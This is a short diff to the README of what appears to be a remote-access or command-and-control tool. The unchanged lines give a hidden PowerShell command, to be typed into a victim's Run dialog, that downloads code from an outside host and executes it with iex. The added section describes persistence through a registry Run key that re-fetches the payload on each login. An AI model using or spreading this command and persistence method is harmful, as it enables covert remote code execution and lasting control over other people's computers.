@@ -71,6 +71,11 @@ run the following command on victim in 'run' (win+r)
 C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c "$command = iwr -Uri https://220.ip-54-37-16.eu/ -Method GET  -UseBasicParsing; iex $command"
 ```
 
+
+## Persistence
+
+When the victim checks in for the first time, an entry in ```HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run``` will be added that downloads the oneliner version of the payload
+
 ## TODO
 ### Error check in menu
 ### Install script
